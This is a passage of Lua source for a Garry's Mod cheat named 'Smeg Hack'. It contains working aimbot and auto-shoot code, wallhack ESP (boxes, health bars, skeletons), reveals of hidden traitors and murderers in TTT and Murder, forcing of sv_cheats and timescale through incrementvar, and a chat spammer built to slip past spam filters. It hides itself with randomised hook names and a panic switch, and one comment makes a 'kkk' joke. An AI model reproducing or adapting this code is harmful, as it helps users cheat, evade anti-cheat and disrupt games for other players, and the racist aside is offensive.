		if GetConVarNumber("sv_cheats") != NormSvCheats then LocalPlayer():ConCommand("incrementvar sv_cheats "..NormSvCheats.." "..NormSvCheats.." "..NormSvCheats) end
		if GetConVarNumber("host_timescale") != NormHostTimeScale then LocalPlayer():ConCommand("incrementvar host_timescale "..NormHostTimeScale.." "..NormHostTimeScale.." "..NormHostTimeScale) end
		if Display then
			AddHook( "Unloaded", "HUDPaint", RandomString(), function()
				draw.SimpleTextOutlined( "Smeg Hack Unloaded Successfully!", "Menu_Title", ScrW()/2, 50, Color(0,150,150), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
				timer.Simple( 3, function()
					RemoveHook("Unloaded")
				end)
			end)
		end
	end)
end

function ReloadSmegHack( Display )
	local Admin = SmegHack.Options["Misc_AdminBox"]
	local Spec = SmegHack.Options["Misc_SpectatorsBox"]
	UnloadSmegHack()
	timer.Simple( 0.5, function()
		LoadSmegHack()
		if Admin then
			SmegHack.Options["Misc_AdminBox"] = true
			AddDisplayBox( "Admins", 1 )
		end
		if Spec then
			SmegHack.Options["Misc_SpectatorsBox"] = true
			AddDisplayBox( "Spectators", 2 )
		end
		LocalPlayer():ConCommand("SmegHack_Menu")
		if Display then
			AddHook( "Reloaded", "HUDPaint", RandomString(), function()
				draw.SimpleTextOutlined( "Smeg Hack Reloaded Successfully!", "Menu_Title", ScrW()/2, 50, Color(0,150,150), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
				timer.Simple( 3, function()
					RemoveHook("Reloaded")
				end)
			end)
		end
	end)
end

function LoadSmegHack( Display )
	//Commands
	CreateClientConVar("SmegHack_Panic", 0, false, false)
	concommand.Add("SmegHack_Menu", SmegHackMenu)

	local EntTable = ents.GetAll()
	local FastWalk = false
	local MenuDelay, FPSDelay = false, false
	local ForwardMove = 0
	local SideMove = 0
	local TapS = false
	local WLeft, WRight, WForward, WBack, WActive = false, false, true, false, false
	local NoclipPos, NoclipAngles, NoclipOn, NoclipX, NoclipY, NoclipDuck, NoclipJump = LocalPlayer():EyePos(), LocalPlayer():GetAngles(), false, 0, 0, false, false
	local ScaleActive, ScaleNum = false, 1
	local SpamWait, Spam1, Spam2, Spam3, Spam4, Spam5 = false, false, false, false, false, false
	
	//Hooks
	AddHook( "Menu", "Think", RandomString(), function()
		if input.IsKeyDown(KEY_INSERT) && !MenuDelay then
			MenuDelay = true
			SmegHackMenu()
			timer.Simple( 0.5, function() MenuDelay = false end )
		end

		//For FPS
		if FPSDelay == false then
			FPSDelay = true
			timer.Simple( 0.5, function() FPSValue = math.Round(1/RealFrameTime()) FPSDelay = false end )
		end

		//For Time Scale
		if SmegHack.Options["Misc_Clock"] && GetConVarNumber("SmegHack_Panic") == 0 then
			if GetConVarNumber("sv_cheats") != 1 then LocalPlayer():ConCommand("incrementvar sv_cheats 1 1 1") end
			if SmegHack.Options["Misc_Clock_Speed"] != ScaleNum || !ScaleActive || TimeScaleChange then
				local k
				if SmegHack.Options["Misc_Clock_Mode"] == "Slow" then k = 1-(SmegHack.Options["Misc_Clock_Speed"]/10) else k = SmegHack.Options["Misc_Clock_Speed"] end
				LocalPlayer():ConCommand("incrementvar host_timescale "..k.." "..k.." "..k) //Sozz, but I had to add kkk in somewhere :P
				ScaleNum = k
				if !ScaleActive then ScaleActive = true end
			end
		elseif SmegHack.Options["Misc_Clock"] && GetConVarNumber("SmegHack_Panic") == 1 then
			if ScaleActive then
				LocalPlayer():ConCommand("incrementvar sv_cheats "..NormSvCheats.." "..NormSvCheats.." "..NormSvCheats)
				LocalPlayer():ConCommand("incrementvar host_timescale "..NormHostTimeScale.." "..NormHostTimeScale.." "..NormHostTimeScale)
				ScaleActive = false
			end
		end
		//Reset T Round
		if GMode == 1 then
			if GetRoundState() != 3 then
				table.Empty(SmegHack.Traitors)
			else
				for k, v in pairs(player.GetAll()) do
					local Ply = v
					local Team = Ply:GetRole()
					if Team == 2 then return end
					if LocalPlayer():GetRole() != 1 then
						for k, v in pairs(Ply:GetWeapons()) do
							if table.HasValue(v.CanBuy, 1) && !table.HasValue(SmegHack.Traitors, Ply:SteamID()) then
								table.insert(SmegHack.Traitors, Ply:SteamID())
							end
						end
					else
						if Team == 1 && !table.HasValue(SmegHack.Traitors, Ply:SteamID()) then
							table.insert(SmegHack.Traitors, Ply:SteamID())
						end
					end
				end
			end
		elseif GMode == 2 then
			if !MDone then
				for k, v in pairs(ents.GetAll()) do
					if v:GetClass() == "weapon_mu_knife" then
						table.insert(SmegHack.Murderers, v:GetOwner():SteamID())
					end
				end
				MDone = true
			else
				for k, v in pairs(ents.GetAll()) do
					if v:GetClass() == "weapon_mu_knife" then
						if !table.HasValue(SmegHack.Murderers, v:GetOwner():SteamID()) then
							table.Empty(SmegHack.Murderers)
							MDone = false
						end
					end
				end
			end
		end
	end)

	AddHook( "Aimbot", "Think", RandomString(), function()
		if GetConVarNumber("SmegHack_Panic") == 0 && SmegHack.Options["Aimbot_Toggle"] && !MenuOpen && !(SmegHack.Options["Cams_Toggle"] && SmegHack.Options["Cams_CSNoclip"]) then
			if !SmegHack.Options["Aimbot_AimOnKey"] || ( ( ( SmegHack.Options["Aimbot_AimOnKey_Key"] >= 107 && SmegHack.Options["Aimbot_AimOnKey_Key"] <= 113 ) && input.IsMouseDown(SmegHack.Options["Aimbot_AimOnKey_Key"]) ) || input.IsKeyDown(SmegHack.Options["Aimbot_AimOnKey_Key"]) ) then
				local FinAngleP
				local AimSpotT = {}
				local PlayerDistance, NewPlayerDistance, MousePos, NewMousePos = math.huge, math.huge, math.huge, math.huge
				if !SmegHack.Options["Aimbot_StickToTarget"] then EntTable = ents.GetAll() end
				for k, v in pairs(EntTable) do
					if v != LocalPlayer() && v:IsValid() && v:Health() > 0 && ( v:IsNPC() || v:IsPlayer() ) then
						local Ent = v
						local AimTeam, AimOpponents, AimFriends, AimEnemies, AimSpectators, AimNPCs = false, false, false, false, false, false
						local AimTeamV, AimOpponentsV, AimFriendsV, AimEnemiesV, AimSpectatorsV, AimNPCsV = true, true, true, true, true, true
						if !Ent:IsNPC() then
							local Team, _ = GetTeam(Ent)
							if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["Aimbot_AimTeam"] && Team == GetTeam(LocalPlayer()) then
								if SmegHack.Options["Aimbot_AimTeamV"] == "Aim" then
									AimTeam = true
								else
									AimTeamV = false
								end
							end
							if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["Aimbot_AimOpponents"] && Team != GetTeam(LocalPlayer()) then
								if SmegHack.Options["Aimbot_AimOpponentsV"] == "Aim" then
									AimOpponents = true
								else
									AimOpponentsV = false
								end
							end
							if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["Aimbot_AimFriends"] && ( (!SmegHack.Options["Friends_FriendIsEnemy"] && table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) || (SmegHack.Options["Friends_FriendIsEnemy"] && !table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) ) then
								if SmegHack.Options["Aimbot_AimFriendsV"] == "Aim" then
									AimFriends = true
								else
									AimFriendsV = false
								end
							end
							if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["Aimbot_AimEnemies"] && ( (!SmegHack.Options["Friends_FriendIsEnemy"] && !table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) || (SmegHack.Options["Friends_FriendIsEnemy"] && table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) ) then
								if SmegHack.Options["Aimbot_AimEnemiesV"] == "Aim" then
									AimEnemies = true
								else
									AimEnemiesV = false
								end
							end
							if SmegHack.Options["Aimbot_AimSpectators"] && Ent:Team() == TEAM_SPECTATOR then
								if SmegHack.Options["AimSpectatorsV"] == "Aim" then
									AimSpectators = true
								else
									AimSpectatorsV = false
								end
							end
						else
							if SmegHack.Options["Aimbot_AimNPCs"] && SmegHack.Options["Aimbot_AimNPCsV"] == "Aim" then
								if SmegHack.Options["Aimbot_AimNPCsV"] == "Aim" then
									AimNPCs = true
								else
									AimNPCsV = false
								end
							end
						end
						if (AimTeam || AimOpponents || AimFriends || AimEnemies || AimSpectators || AimNPCs) && (AimTeamV && AimOpponentsV && AimFriendsV && AimEnemiesV && AimSpectatorsV && AimNPCsV) then
							local LOS, AimP, AimF = false, false, false
							local AimSpot

							if SmegHack.Options["Aimbot_BoneAim"] && SmegHack.BoneOrder[1] != nil then
								table.Empty( AimSpotT )
								for k, v in pairs(SmegHack.BoneOrder) do
									if Ent:GetBonePosition(Ent:LookupBone(v)) != nil && AimSpot == nil then
										AimSpot = Ent:GetBonePosition(Ent:LookupBone(v))
									end
									if Ent:GetBonePosition(Ent:LookupBone(v)) != nil then
										local BonePos = Ent:GetBonePosition(Ent:LookupBone(v))
										if v == "ValveBiped.Bip01_Head1" then BonePos = BonePos+Vector(0,0,1) end
										table.insert( AimSpotT, BonePos )
									end
								end
								if AimSpot == nil then AimSpot = Ent:LocalToWorld(Ent:OBBCenter()) end
								if AimSpotT == nil then AimSpotT = {Ent:LocalToWorld(Ent:OBBCenter())} end
							else
								AimSpot = Ent:LocalToWorld(Ent:OBBCenter())
								AimSpotT = {Ent:LocalToWorld(Ent:OBBCenter())}
							end

							local CurAngle = LocalPlayer():EyeAngles()
							local CurPos = LocalPlayer():GetShootPos()

							AimSpot = AimSpot+(CurAngle:Right()*SmegHack.Options["Aimbot_OffsetX"]) //This is screw up when close to your target
							AimSpot.z = AimSpot.z + SmegHack.Options["Aimbot_OffsetY"]

							local FinAngle = ( AimSpot - CurPos ):Angle()
							if FinAngle.y > 180 then
								FinAngle.y = FinAngle.y-360
							end

							if SmegHack.Options["Aimbot_AimPriority"] == "Distance" then
								if LocalPlayer():GetShootPos():Distance(AimSpot) < PlayerDistance then NewPlayerDistance = LocalPlayer():GetShootPos():Distance(AimSpot) AimP = true end
							elseif SmegHack.Options["Aimbot_AimPriority"] == "Crosshair" then
								local FirstCalc = math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
								local Calc
								if FirstCalc > 180 && ( ( CurAngle.y >= 0 && FinAngle.y < 0 ) || ( CurAngle.y < 0 && FinAngle.y >= 0 ) ) then
									Calc = 360 - math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
								else
									Calc = math.Distance( CurAngle.x, CurAngle.y, FinAngle.x, FinAngle.y )
								end
								if Calc < MousePos then NewMousePos = Calc AimP = true end
							end

							if SmegHack.Options["Aimbot_FOV"] then
								local CalcX = FinAngle.y - CurAngle.y
								local CalcY = FinAngle.x - CurAngle.x
								if CalcY < 0 then CalcY = CalcY * -1 end
								if CalcX < 0 then CalcX = CalcX * -1 end
								if CalcY > 180 then CalcY = 360 - CalcY end
								if CalcX > 180 then CalcX = 360 - CalcX end
								if CalcX <= SmegHack.Options["Aimbot_FOV_Value"]/2 && CalcY <= SmegHack.Options["Aimbot_FOV_Value"]*0.4 then AimF = true end
							else
								AimF = true
							end

							if SmegHack.Options["Aimbot_LOSCheck"] || SmegHack.Options["Aimbot_AutoWall"] then
								for k, v in pairs(AimSpotT) do
									local TrLOS = {}
									TrLOS.start = LocalPlayer():GetShootPos()
									TrLOS.endpos = v
									TrLOS.filter = {}
									if SmegHack.Options["Aimbot_StickToTarget"] then
										for k, v in pairs(ents.GetAll()) do
											if v:IsValid() && ( v:IsPlayer() || v:IsNPC() ) then
												table.insert( TrLOS.filter, v )
											end
										end
									else TrLOS.filter = {LocalPlayer(), Ent} end
									if SmegHack.Options["Aimbot_AutoWall"] then TrLOS.mask = MASK_SHOT else TrLOS.mask = MASK_VISIBLE_AND_NPCS end
									if util.TraceLine(TrLOS).Fraction == 1 then
										LOS = true
										AimSpot = v
										break
									end
								end
							else
								LOS = true
							end
							if LOS && AimP && AimF then
								EntTable = {Ent}
								FinAngleP = FinAngle
								PlayerDistance = NewPlayerDistance
								MousePos = NewMousePos
							elseif SmegHack.Options["Aimbot_StickToTarget"] && EntTable[2] != nil then
								EntTable = ents.GetAll()
							end
						end
					end
				end
				if EntTable != nil && FinAngleP != nil then
					if SmegHack.Options["Aimbot_SmoothAim"] then
						SmoothAngles( FinAngleP, SmegHack.Options["Aimbot_SmoothAim_Value"] )
					else
						if SmegHack.Options["Aimbot_AutoShoot"] then
							LocalPlayer():SetEyeAngles(FinAngleP)
							LocalPlayer():ConCommand("+attack")
							timer.Simple( 0.1, function() LocalPlayer():ConCommand("-attack") end )
						else
							LocalPlayer():SetEyeAngles(FinAngleP)
						end
					end
				elseif EntTable[2] == nil then
					EntTable = ents.GetAll()
				end
			else
				if EntTable[2] == nil then
					EntTable = ents.GetAll()
				end
			end
		end
	end)
	AddHook( "ChatSpam", "Think", RandomString(), function()
		if GetConVarNumber("SmegHack_Panic") == 0 then
			if !SpamWait then
				if SmegHack.Options["Spam_Toggle"] then
					if SmegHack.Options["Spam_Delay"] then
						SpamWait = true
						Spam1, Spam2, Spam3, Spam4, Spam5 = false, false, false, false, false
						local Timer = SmegHack.Options["Spam_Delay_Value"]
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam1"] != nil then
							local String = SmegHack.TextEntries["Spam1"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							timer.Simple( Timer, function()
								LocalPlayer():ConCommand("say "..String)
								Spam1 = true
							end)
							Timer = Timer + SmegHack.Options["Spam_Delay_Value"]
						else Spam1 = true end

						if SmegHack.Options["Spam_Message_2"] && SmegHack.TextEntries["Spam2"] != nil then
							local String = SmegHack.TextEntries["Spam2"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							timer.Simple( Timer, function()
								LocalPlayer():ConCommand("say "..String)
								Spam2 = true
							end)
							Timer = Timer + SmegHack.Options["Spam_Delay_Value"]
						else Spam2 = true end

						if SmegHack.Options["Spam_Message_3"] && SmegHack.TextEntries["Spam3"] != nil then
							local String = SmegHack.TextEntries["Spam3"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							timer.Simple( Timer, function()
								LocalPlayer():ConCommand("say "..String)
								Spam3 = true
							end)
							Timer = Timer + SmegHack.Options["Spam_Delay_Value"]
						else Spam3 = true end

						if SmegHack.Options["Spam_Message_4"] && SmegHack.TextEntries["Spam4"] != nil then
							local String = SmegHack.TextEntries["Spam4"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							timer.Simple( Timer, function()
								LocalPlayer():ConCommand("say "..String)
								Spam4 = true
							end)
							Timer = Timer + SmegHack.Options["Spam_Delay_Value"]
						else Spam4 = true end

						if SmegHack.Options["Spam_Message_5"] && SmegHack.TextEntries["Spam5"] != nil then
							local String = SmegHack.TextEntries["Spam5"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							timer.Simple( Timer, function()
								LocalPlayer():ConCommand("say "..String)
								Spam5 = true
							end)
							Timer = Timer + SmegHack.Options["Spam_Delay_Value"]
						else Spam5 = true end
					else
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam1"] != nil then
							local String = SmegHack.TextEntries["Spam1"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							LocalPlayer():ConCommand("say "..String)
						end
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam2"] != nil then
							local String = SmegHack.TextEntries["Spam2"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							LocalPlayer():ConCommand("say "..String)
						end
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam3"] != nil then
							local String = SmegHack.TextEntries["Spam3"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							LocalPlayer():ConCommand("say "..String)
						end
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam4"] != nil then
							local String = SmegHack.TextEntries["Spam4"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							LocalPlayer():ConCommand("say "..String)
						end
						if SmegHack.Options["Spam_Message_1"] && SmegHack.TextEntries["Spam5"] != nil then
							local String = SmegHack.TextEntries["Spam5"]
							if SmegHack.Options["Spam_AntiAntiSpam"] then String = String.." ("..RandomShortString()..")" end
							LocalPlayer():ConCommand("say "..String)
						end
					end
				end
			else
				if Spam1 && Spam2 && Spam3 && Spam4 && Spam5 then SpamWait = false end
			end
		end
	end)
	AddHook( "ESP", "HUDPaint", RandomString(), function()
		if GetConVarNumber("SmegHack_Panic") == 0 then
			if SmegHack.Options["Cams_Toggle"] && SmegHack.Options["Cams_CSNoclip"] then
				local MaxX, MaxY, MinX, MinY = ESPGetPos( LocalPlayer() )
				local Dist = math.floor(LocalPlayer():GetPos():Distance(NoclipPos)/40)
				draw.SimpleTextOutlined( "You are here ".."["..Dist.."]", "Cams", ((MaxX-MinX)/2)+MinX, MinY-5, Color(0,150,250), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color(0,0,0) )
				surface.SetDrawColor( Color(0,0,255) )
				surface.DrawLine( MaxX, MaxY, MinX, MaxY )
				surface.DrawLine( MaxX, MaxY, MaxX, MinY )
				surface.DrawLine( MinX, MinY, MaxX, MinY )
				surface.DrawLine( MinX, MinY, MinX, MaxY )
			end
			if SmegHack.Options["ESP_Toggle"] || SmegHack.Options["ESP_Entity_Toggle"] then
				for k, v in pairs( ents.GetAll() ) do
					if v:IsValid() && v != LocalPlayer() && !v:IsDormant() then
						local Ent = v
						if SmegHack.Options["ESP_Entity_Toggle"] then
							for k, v in pairs( SmegHack.EntityESP ) do
								if v == Ent:GetClass() && Ent:GetOwner() != LocalPlayer()  then
									local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8 = ESPGetPos( Ent )
									if SmegHack.Options["ESP_Entities_NameTags"] == true then
										local Name = Ent:GetClass()
										local Dist = math.floor(Ent:GetPos():Distance(LocalPlayer():GetShootPos())/40)
										draw.SimpleTextOutlined( Name.." ["..Dist.."]", "ESP_Font_Entity", ((MaxX-MinX)/2)+MinX, MinY-5, Color(0,160,240), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color(0,0,0) )
									end
									if SmegHack.Options["ESP_Entities_BoundaryBoxes"] == true then
										surface.SetDrawColor( Color(0,160,240) )
										if SmegHack.Options["ESP_Entities_BoundaryBoxes_Mode"] == "2D" then
											surface.DrawLine( MaxX, MaxY, MinX, MaxY )
											surface.DrawLine( MaxX, MaxY, MaxX, MinY )
											surface.DrawLine( MinX, MinY, MaxX, MinY )
											surface.DrawLine( MinX, MinY, MinX, MaxY )
										else
											//Top Box
											surface.DrawLine( V4.x, V4.y, V6.x, V6.y )
											surface.DrawLine( V1.x, V1.y, V8.x, V8.y )
											surface.DrawLine( V6.x, V6.y, V8.x, V8.y )
											surface.DrawLine( V4.x, V4.y, V1.x, V1.y )

											//Bottom Box
											surface.DrawLine( V3.x, V3.y, V5.x, V5.y )
											surface.DrawLine( V2.x, V2.y, V7.x, V7.y )
											surface.DrawLine( V3.x, V3.y, V2.x, V2.y )
											surface.DrawLine( V5.x, V5.y, V7.x, V7.y )

											//Verticals
											surface.DrawLine( V3.x, V3.y, V4.x, V4.y )
											surface.DrawLine( V2.x, V2.y, V1.x, V1.y )
											surface.DrawLine( V7.x, V7.y, V8.x, V8.y )
											surface.DrawLine( V5.x, V5.y, V6.x, V6.y )
										end
									end
								end
							end
						end
						if SmegHack.Options["ESP_Toggle"] then
							if SmegHack.Options["ESP_Crosshair"] == true then
								local _, TeamColor = GetTeam(LocalPlayer())
								if SmegHack.Options["ESP_Crosshair_Mode"] == "Team" && Color(SmegHack.Options["ESP_Crosshair_Color_R"], SmegHack.Options["ESP_Crosshair_Color_G"], SmegHack.Options["ESP_Crosshair_Color_B"]) != TeamColor then
									SmegHack.Options["ESP_Crosshair_Color_R"] = TeamColor.r
									SmegHack.Options["ESP_Crosshair_Color_G"] = TeamColor.g
									SmegHack.Options["ESP_Crosshair_Color_B"] = TeamColor.b
								end
								surface.SetDrawColor(Color(SmegHack.Options["ESP_Crosshair_Color_R"], SmegHack.Options["ESP_Crosshair_Color_G"], SmegHack.Options["ESP_Crosshair_Color_B"], SmegHack.Options["ESP_Crosshair_Color_A"]))
								surface.DrawLine((ScrW()/2)-SmegHack.Options["ESP_Crosshair_Size"], ScrH()/2, (ScrW()/2)+SmegHack.Options["ESP_Crosshair_Size"], ScrH()/2)
								surface.DrawLine(ScrW()/2, (ScrH()/2)-SmegHack.Options["ESP_Crosshair_Size"], ScrW()/2, (ScrH()/2)+SmegHack.Options["ESP_Crosshair_Size"])
							end
							if Ent:IsNPC() || Ent:IsPlayer() then
								local Name
								local ShowTeam, ShowOpponents, ShowFriends, ShowEnemies, ShowNPCs, ShowSpectators = false, false, false, false, false, false
								local ShowTeamV, ShowOpponentsV, ShowFriendsV, ShowEnemiesV, ShowNPCsV, ShowSpectatorsV = true, true, true, true, true, true

								if !Ent:IsNPC() && Ent:Health() > 0 then
									local Team, _ = GetTeam(Ent)
									if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["ESP_ShowTeam"] && Team == GetTeam(LocalPlayer()) then
										if SmegHack.Options["ESP_ShowTeamV"] == "Show" then
											ShowTeam = true
										else
											ShowTeamV = false
										end
									end
									if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["ESP_ShowOpponents"] && Team != GetTeam(LocalPlayer()) then
										if SmegHack.Options["ESP_ShowOpponentsV"] == "Show" then
											ShowOpponents = true
										else
											ShowOpponentsV = false
										end
									end
									if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["ESP_ShowFriends"] && ( (!SmegHack.Options["Friends_FriendIsEnemy"] && table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) || (SmegHack.Options["Friends_FriendIsEnemy"] && !table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) ) then
										if SmegHack.Options["ESP_ShowFriendsV"] == "Show" then
											ShowFriends = true
										else
											ShowFriendsV = false
										end
									end
									if Ent:Team() != TEAM_SPECTATOR && SmegHack.Options["ESP_ShowEnemies"] && ( (!SmegHack.Options["Friends_FriendIsEnemy"] && !table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) || (SmegHack.Options["Friends_FriendIsEnemy"] && table.HasValue( SmegHack.FriendsList, Ent:SteamID() ) ) ) then
										if SmegHack.Options["ESP_ShowEnemiesV"] =="Show" then
											ShowEnemies = true
										else
											ShowEnemiesV = false
										end
									end
									if SmegHack.Options["ESP_ShowSpectators"] && Ent:Team() == TEAM_SPECTATOR then
										if SmegHack.Options["ESP_ShowSpectatorsV"] == "Show" then
											ShowSpectators = true
										else
											ShowSpectatorsV = false
										end
									end
									Name = Ent:Nick()
								else
									if SmegHack.Options["ESP_ShowNPCs"] && Ent:IsNPC() then
										if SmegHack.Options["ESP_ShowNPCsV"] == "Show" then
											ShowNPCs = true
										else
											ShowNPCsV = false
										end
									end
									Name = Ent:GetClass()
								end
								if (ShowTeam || ShowOpponents || ShowFriends || ShowEnemies || ShowNPCs || ShowSpectators) && (ShowTeamV && ShowOpponentsV && ShowFriendsV && ShowEnemiesV && ShowNPCsV && ShowSpectatorsV) then
									local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8 = ESPGetPos( Ent )
									local DrawColor
									local ESPPos = MinY
									if Ent:IsNPC() then	DrawColor = Color(170,220,120) else _, DrawColor = GetTeam(Ent) end
									if SmegHack.Options["ESP_BoundaryBoxes"] then
										surface.SetDrawColor( DrawColor )
										if SmegHack.Options["ESP_BoundaryBoxes_Mode"] == "2D" then
											surface.DrawLine( MaxX, MaxY, MinX, MaxY )
											surface.DrawLine( MaxX, MaxY, MaxX, MinY )
											surface.DrawLine( MinX, MinY, MaxX, MinY )
											surface.DrawLine( MinX, MinY, MinX, MaxY )
										else
											//Top Box
											surface.DrawLine( V4.x, V4.y, V6.x, V6.y )
											surface.DrawLine( V1.x, V1.y, V8.x, V8.y )
											surface.DrawLine( V6.x, V6.y, V8.x, V8.y )
											surface.DrawLine( V4.x, V4.y, V1.x, V1.y )

											//Bottom Box
											surface.DrawLine( V3.x, V3.y, V5.x, V5.y )
											surface.DrawLine( V2.x, V2.y, V7.x, V7.y )
											surface.DrawLine( V3.x, V3.y, V2.x, V2.y )
											surface.DrawLine( V5.x, V5.y, V7.x, V7.y )

											//Verticals
											surface.DrawLine( V3.x, V3.y, V4.x, V4.y )
											surface.DrawLine( V2.x, V2.y, V1.x, V1.y )
											surface.DrawLine( V7.x, V7.y, V8.x, V8.y )
											surface.DrawLine( V5.x, V5.y, V6.x, V6.y )
										end
									end
									if SmegHack.Options["ESP_Health"] then					
										local HealthColor = Color( (1-(Ent:Health()/Ent:GetMaxHealth()))*255, (Ent:Health()/Ent:GetMaxHealth())*255, 0 )
										local HealthString = tostring(Ent:Health())

										if MaxY-MinY <= 45 then
											local TopHealthFar = ((1-(Ent:Health()/Ent:GetMaxHealth()))*43)+MinY+1
											local BottomHealthFar = 43-((1-(Ent:Health()/Ent:GetMaxHealth()))*43)
											draw.RoundedBox( 0, MinX-15, MinY, 10, 45, Color(0,0,0) )
											draw.RoundedBox( 0, MinX-14, TopHealthFar, 8, BottomHealthFar, HealthColor )
											draw.SimpleTextOutlined( HealthString.."%", "ESP_Font_Entity", MinX-17, MinY+22.5, HealthColor, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
										else
											local TopHealthClose = (MinY+((1-(Ent:Health()/Ent:GetMaxHealth()))*(MaxY-MinY)))+1
											local BottomHealthClose = ((Ent:Health()/Ent:GetMaxHealth())*(MaxY-MinY))-2
											draw.RoundedBox( 0, MinX-15, MinY, 10, MaxY-MinY, Color(0,0,0) )
											draw.RoundedBox( 0, MinX-14, TopHealthClose, 8, BottomHealthClose, HealthColor )
											draw.SimpleTextOutlined( HealthString.."%", "ESP_Font_Entity", MinX-17, ((MinY-MaxY)/2)+MaxY, HealthColor, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
										end

									end
									if SmegHack.Options["ESP_NameTags"] then
										if GMode == 2 && Ent:GetBystanderName() != nil then

											draw.SimpleTextOutlined( "N: "..Name.." ("..Ent:GetBystanderName()..")", "ESP_Font_Main", MaxX+5, ESPPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
										else
											draw.SimpleTextOutlined( "N: "..Name, "ESP_Font_Main", MaxX+5, ESPPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
										end
										ESPPos = ESPPos + 15
									end
									if SmegHack.Options["ESP_Weapon"] then
										if Ent:GetActiveWeapon():IsValid() then
											local WName = Ent:GetActiveWeapon():GetPrintName()
											draw.SimpleTextOutlined( "W: "..WName, "ESP_Font_Main", MaxX+5, ESPPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
											ESPPos = ESPPos + 15
										end
									end
									if SmegHack.Options["ESP_Distance"] then
										local Dist = math.floor(Ent:GetPos():Distance(LocalPlayer():GetShootPos())/40)
										draw.SimpleTextOutlined( "D: "..Dist, "ESP_Font_Main", MaxX+5, ESPPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
										ESPPos = ESPPos + 15
									end
									if SmegHack.Options["ESP_Skeleton"] then
										local Bones = {}
										local Success = true
										for k, v in pairs(SmegHack.Bones) do
											if Ent:LookupBone(v) != nil && Ent:GetBonePosition(Ent:LookupBone(v)) != nil then
												table.insert( Bones, Ent:GetBonePosition(Ent:LookupBone(v)):ToScreen() )
											else
												Success = false //Just incase entities have some bones but not others (I have no idea if that happens, but I figgured better safe then sorry)
												return
											end
										end
										if Success then
											surface.SetDrawColor( DrawColor )
											//Spine
											surface.DrawLine( Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y )
											surface.DrawLine( Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y )
											surface.DrawLine( Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y )
											surface.DrawLine( Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y )
											surface.DrawLine( Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y )
											surface.DrawLine( Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y )

											//Legs
											surface.DrawLine( Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y )
											surface.DrawLine( Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y )
											surface.DrawLine( Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y )
											surface.DrawLine( Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y )

											surface.DrawLine( Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y )
											surface.DrawLine( Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y )
											surface.DrawLine( Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y )
											surface.DrawLine( Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y )

											//Arms
											surface.DrawLine( Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y )
											surface.DrawLine( Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y )
											surface.DrawLine( Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y )

											surface.DrawLine( Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y )
